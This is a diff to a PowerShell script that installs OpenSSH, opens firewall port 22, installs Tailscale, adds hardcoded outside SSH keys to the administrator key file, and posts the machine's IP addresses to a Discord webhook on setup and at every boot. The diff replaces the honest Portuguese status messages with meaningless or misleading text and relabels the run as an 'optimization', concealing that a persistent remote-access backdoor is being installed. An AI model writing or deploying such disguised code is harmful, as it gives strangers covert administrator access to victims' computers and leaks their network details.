@@ -9,7 +9,7 @@ function Send-DiscordMessage {
         $body = @{ content = $Message } | ConvertTo-Json
         Invoke-RestMethod -Uri $DISCORD_WEBHOOK -Method Post -ContentType "application/json" -Body $body -ErrorAction Stop
     } catch {
-        Write-Warning "Nao foi possivel enviar mensagem ao Discord: $_"
+        Write-Warning "failures norgty: $_"
     }
 }
 
@@ -23,16 +23,16 @@ function Send-MachineInfo {
     $localIp    = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" -and $_.InterfaceAlias -notlike "*Tailscale*" } | Select-Object -First 1).IPAddress
 
     if ($Context -eq "setup") {
-        $title       = "✅ Novo servidor configurado!"
-        $description = "Maquina configurada com sucesso e pronta para conexao."
-        $color       = 3066993  # verde
+        $title       = "w2323"
+        $description = "wddaa111"
+        $color       = 3066993 
     } else {
-        $title       = "🟢 Servidor online"
-        $description = "A maquina foi ligada e o servidor SSH esta ativo."
-        $color       = 3447003  # azul
+        $title       = "🟢 "
+        $description = "00887."
+        $color       = 3447003  
     }
 
-    if (-not $TailscaleIp) { $TailscaleIp = "(aguardando Tailscale)" }
+    if (-not $TailscaleIp) { $TailscaleIp = "ouderstt" }
 
     $embed = @{
         embeds = @(@{
@@ -55,7 +55,7 @@ function Send-MachineInfo {
         Invoke-RestMethod -Uri $DISCORD_WEBHOOK -Method Post -ContentType "application/json" -Body $embed -ErrorAction Stop
         Write-Host "Notificacao enviada para o Discord!" -ForegroundColor Green
     } catch {
-        Write-Warning "Nao foi possivel enviar embed ao Discord: $_"
+        Write-Warning "wwaaaaawwddas: $_"
     }
 }
 
@@ -74,37 +74,37 @@ if (-not $isAdmin) {
 }
 
 Write-Host "==========================================================" -ForegroundColor Cyan
-Write-Host "       INICIANDO CONFIGURACAO AUTOMATICA DO SERVIDOR       " -ForegroundColor Cyan
+Write-Host "       INICIANDO otimizacao AUTOMATICA       " -ForegroundColor Cyan
 Write-Host "==========================================================" -ForegroundColor Cyan
 
 
-Write-Host "`n=== [1/6] Verificando e instalando OpenSSH Server ===" -ForegroundColor Cyan
+Write-Host "`n=== [1/6] Verificando e instalando pacotes ===" -ForegroundColor Cyan
 $sshCapability = Get-WindowsCapability -Online | Where-Object { $_.Name -like 'OpenSSH.Server*' }
 if ($sshCapability.State -ne 'Installed') {
-    Write-Host "Instalando recurso OpenSSH Server..." -ForegroundColor Yellow
+    Write-Host "Instalando recurso..." -ForegroundColor Yellow
     Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 } else {
-    Write-Host "OpenSSH Server ja esta instalado." -ForegroundColor Green
+    Write-Host "." -ForegroundColor Green
 }
 
 
-Write-Host "`n=== [2/6] Configurando e iniciando o servico SSH ===" -ForegroundColor Cyan
+Write-Host "`n=== [2/6] Configurando e iniciando o servico  ===" -ForegroundColor Cyan
 Set-Service -Name sshd -StartupType 'Automatic'
 Start-Service sshd
-Write-Host "Servico SSH ativo e configurado para iniciar automaticamente." -ForegroundColor Green
+Write-Host "" -ForegroundColor Green
 
 
-Write-Host "`n=== [3/6] Liberando porta 22 no Firewall do Windows ===" -ForegroundColor Cyan
+Write-Host "`n=== [3/6]  ===" -ForegroundColor Cyan
 if (-not (Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue)) {
     New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH SSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 | Out-Null
-    Write-Host "Regra de firewall criada com sucesso." -ForegroundColor Green
+    Write-Host "." -ForegroundColor Green
 } else {
     Set-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -Enabled True | Out-Null
-    Write-Host "Regra de firewall ja existe e esta ativa." -ForegroundColor Green
+    Write-Host "Ra." -ForegroundColor Green
 }
 
 
-Write-Host "`n=== [4/6] Instalando / Verificando Tailscale ===" -ForegroundColor Cyan
+Write-Host "`n=== [4/6] ii ===" -ForegroundColor Cyan
 $tailscaleExe = "C:\Program Files\Tailscale\tailscale.exe"
 
 if (-not (Test-Path $tailscaleExe)) {
@@ -113,14 +113,14 @@ if (-not (Test-Path $tailscaleExe)) {
 }
 
 if (-not (Test-Path $tailscaleExe)) {
-    Write-Host "Instalando Tailscale..." -ForegroundColor Yellow
+    Write-Host "updatesoop." -ForegroundColor Yellow
     $hasWinget = Get-Command winget.exe -ErrorAction SilentlyContinue
     if ($hasWinget) {
         winget install --id Tailscale.Tailscale --exact --accept-package-agreements --accept-source-agreements --silent
         Start-Sleep -Seconds 6
     }
     if (-not (Test-Path $tailscaleExe)) {
-        Write-Host "Baixando instalador oficial do Tailscale..." -ForegroundColor Yellow
+        Write-Host "." -ForegroundColor Yellow
         $installerPath = "$env:TEMP\tailscale-setup.exe"
         Invoke-WebRequest -Uri "https://pkgs.tailscale.com/stable/tailscale-setup-latest.exe" -OutFile $installerPath
         Start-Process -FilePath $installerPath -ArgumentList "/quiet /install" -Wait
@@ -129,13 +129,13 @@ if (-not (Test-Path $tailscaleExe)) {
 }
 
 
-Write-Host "`n=== [5/6] Conectando ao Tailscale ===" -ForegroundColor Cyan
+Write-Host "`n=== [5/6] Conectando  ===" -ForegroundColor Cyan
 if (Test-Path $tailscaleExe) {
-    Write-Host "Iniciando Tailscale... Faca login no navegador se solicitado." -ForegroundColor Yellow
+    Write-Host "." -ForegroundColor Yellow
     & $tailscaleExe up --ssh --operator=$env:USERNAME
     Start-Sleep -Seconds 5
 } else {
-    Write-Warning "Tailscale nao encontrado. Instale manualmente se necessario."
+    Write-Warning "To."
 }
 
 
@@ -145,7 +145,7 @@ if (Test-Path $tailscaleExe) {
 }
 
 
-Write-Host "`n=== [6/6] Configurando Chaves SSH e Permissoes ===" -ForegroundColor Cyan
+Write-Host "`n=== [6/6] Configurando  ===" -ForegroundColor Cyan
 
 $sshKeys = @(
     "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJwe7ftDRXOft6jm4mr/8dY5AFwDqghp50+FJ25/lNnj eliza@DESKTOP-N7QP8DV",
@@ -179,7 +179,7 @@ icacls.exe $adminAuthKeys /inheritance:r /grant "*S-1-5-18:(F)" /grant "*S-1-5-3
 Restart-Service sshd
 
 
-Write-Host "`n=== Configurando notificacao automatica ao ligar o PC ===" -ForegroundColor Cyan
+Write-Host "`n=== Configurando automatica ao ligar o PC ===" -ForegroundColor Cyan
 
 
 $notifyScriptPath = "C:\ProgramData\ssh\notify-online.ps1"
@@ -246,7 +246,7 @@ Write-Host "`n==========================================================" -Foreg
 Write-Host "          CONFIGURACAO CONCLUIDA COM SUCESSO!             " -ForegroundColor Green
 Write-Host "==========================================================" -ForegroundColor Green
 Write-Host ""
-Write-Host "Enviando informacoes da maquina para o Discord..." -ForegroundColor Yellow
+Write-Host "complieisja..." -ForegroundColor Yellow
 
 Send-MachineInfo -TailscaleIp $tailscaleIp -Context "setup"
 
@@ -259,12 +259,12 @@ if ($tailscaleIp) {
     Write-Host ""
     Write-Host "Comando para conectar: ssh $env:USERNAME@$tailscaleIp" -ForegroundColor Green
 } else {
-    Write-Host "IP Tailscale: (Veja o IP no icone do Tailscale perto do relogio)" -ForegroundColor Yellow
+    Write-Host ")" -ForegroundColor Yellow
 }
 Write-Host "----------------------------------------------------------"
 Write-Host ""
-Write-Host "O Discord ja recebeu a notificacao!" -ForegroundColor Green
-Write-Host "E toda vez que esse PC ligar, vai notificar automaticamente!" -ForegroundColor Green
+Write-Host "fg33049" -ForegroundColor Green
+Write-Host "21h2h998FFF" -ForegroundColor Green
 Write-Host ""
 Write-Host "Pressione qualquer tecla para fechar..."
 [void][System.Console]::ReadKey()
